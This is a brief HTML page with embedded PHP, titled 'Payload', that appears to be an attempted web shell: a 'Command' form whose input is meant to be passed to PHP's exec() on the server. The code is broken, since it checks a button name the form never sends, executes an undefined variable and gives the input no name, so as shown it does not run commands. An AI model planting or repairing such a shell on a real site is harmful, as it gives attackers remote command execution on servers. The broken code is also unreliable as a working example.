<!DOCTYPE html>
<html>
      
<head>
    <title>
        Payload
    </title>
</head>
  
<body style="text-align:center;">
      
    <?php
        if(array_key_exists('cmd_button', $_POST)) {
            butt();
        }
        function butt() {

            echo $_POST["cmd"];
            $output = exec($command);

            echo $output;
        }
    ?>

    <form method="post">
        <label for="cmd_input">Command: </label><input type="text" id="cmd_input">
        <input type="submit" name="cmd" class="button" value="Go!" />
    </form>
</head>
  
</html>

